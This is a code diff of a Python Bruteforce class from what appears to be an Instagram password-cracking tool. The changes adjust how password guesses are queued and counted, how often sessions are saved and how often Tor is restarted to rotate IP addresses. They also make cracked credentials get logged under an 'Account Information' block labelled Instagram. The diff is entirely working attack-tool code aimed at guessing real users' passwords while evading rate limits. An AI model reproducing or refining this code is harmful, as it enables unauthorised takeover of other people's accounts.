@@ -80,10 +80,10 @@ class Bruteforce(Spyder):
    else:pass 
    
    with self.lock:
-    if password in self.passlist.queue:
-     if not self.is_found:self.attempts += 1
+    if all([not self.is_found, self.is_alive, password in self.passlist.queue]):
      self.passlist.queue.pop(self.passlist.queue.index(password)) # remove the password from queue
-    if all([not self.is_found, self.is_alive, not self.attempts%session_save_time]):self.session_write()
+     if not self.attempts%session_save_time:self.session_write()
+     self.attempts += 1
 
   except KeyboardInterrupt:self.kill()
   except:self.proxy_fails += 1
@@ -101,9 +101,9 @@ class Bruteforce(Spyder):
   self.session.update(queue, self.attempts)
 
  def save_cred(self, pwd):
-   creds = 'Username: {}\nPassword: {}\n\n'.format(self.username, pwd)
-   with open(credentials, 'a') as f:f.write(creds)
-   self.is_found = True
+  creds = 'Account Information {{\n  Site: Instagram\n  Email:{}\n  Password: {}\n}}\n\n'.format(self.username, pwd)
+  with open(credentials, 'a') as f:f.write(creds)
+  self.is_found = True
 
  def attack(self):
   while all([not self.is_found, self.is_alive]):
@@ -116,7 +116,7 @@ class Bruteforce(Spyder):
 
     # enable session modification
     self.session_updated = False
-    
+  
     # try all the passwords in the queue
     for pwd in self.passlist.queue:
      if self.threads >= self.max_threads:break
@@ -127,13 +127,13 @@ class Bruteforce(Spyder):
      
     # wait for threads 
     while all([not self.is_found, self.is_alive, self.threads>0, self.ip]):
-     try:sleep(1)
+     try:sleep(0.5)
      except:pass
 
     # renew IP 
     sleep(2)
     self.threads = 0
-    self.restart_tor()
+    if self.is_alive:self.restart_tor()
    except:pass
 
  def password_regulator(self):
@@ -149,7 +149,7 @@ class Bruteforce(Spyder):
       continue
      else:self.retrieve = False
 
-    if self.passlist.qsize() < passlist_max_size:
+    if self.passlist.qsize() != passlist_max_size:
      self.passlist.put(pwd.replace('\n', ''))
     else:
      while all([self.passlist.qsize(), not self.is_found, self.is_alive]):pass
@@ -163,7 +163,7 @@ class Bruteforce(Spyder):
   else:
    self.msg = '\nPassword: {}Not Found{}'.format(colors['red'], colors['white'])\
    if all([not self.msg, not self.reading]) else self.msg
-   self.kill()
+   if self.is_alive:self.kill()
 
  def kill(self):
   self.is_alive = False
@@ -192,6 +192,7 @@ class Bruteforce(Spyder):
 
  def run(self):
   self.attempts = 0 if self.msg else self.attempts
+  self.retrieve = True if self.attempts else False   
   self.msg = None
   self.reading = True
   self.is_alive = True
